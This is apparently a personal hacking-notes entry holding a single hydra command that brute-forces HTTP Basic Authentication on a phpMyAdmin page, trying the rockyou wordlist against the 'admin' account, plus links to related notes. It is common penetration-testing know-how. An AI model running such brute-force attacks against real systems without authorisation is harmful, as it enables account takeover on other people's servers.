# hydra brute force HTTP Basic Authentication
```bash
hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f $IP http-get /phpmyadmin/ -t 15
```

# Related

- [20221003150744](/zet/20221003150744/README.md) hydra brute force
- ~/kb/hacking/commands/hydra.md

Tags:

    #assorted #command #hacking #hydra
